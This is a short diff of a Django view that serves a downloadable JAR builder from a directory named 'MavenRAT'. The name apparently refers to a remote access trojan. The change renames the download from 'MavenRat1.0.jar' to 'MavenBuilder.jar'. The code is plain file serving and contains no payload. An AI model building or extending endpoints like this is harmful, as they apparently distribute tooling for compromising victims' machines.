@@ -282,10 +282,10 @@ def Delivery(request):
 
 @csrf_exempt
 def builder_download(request):
-    file_path = os.path.join(base_dir, 'MavenRAT', 'mavenrat', 'builder', 'MavenRat1.0.jar')
+    file_path = os.path.join(base_dir, 'MavenRAT', 'mavenrat', 'builder', 'MavenBuilder.jar')
     if os.path.exists(file_path):
         # Use FileResponse directly with the file path
-        response = FileResponse(open(file_path, 'rb'), as_attachment=True, filename='MavenRat1.0.jar')
+        response = FileResponse(open(file_path, 'rb'), as_attachment=True, filename='MavenBuilder.jar')
         return response
     else:
         raise Http404('File not found')
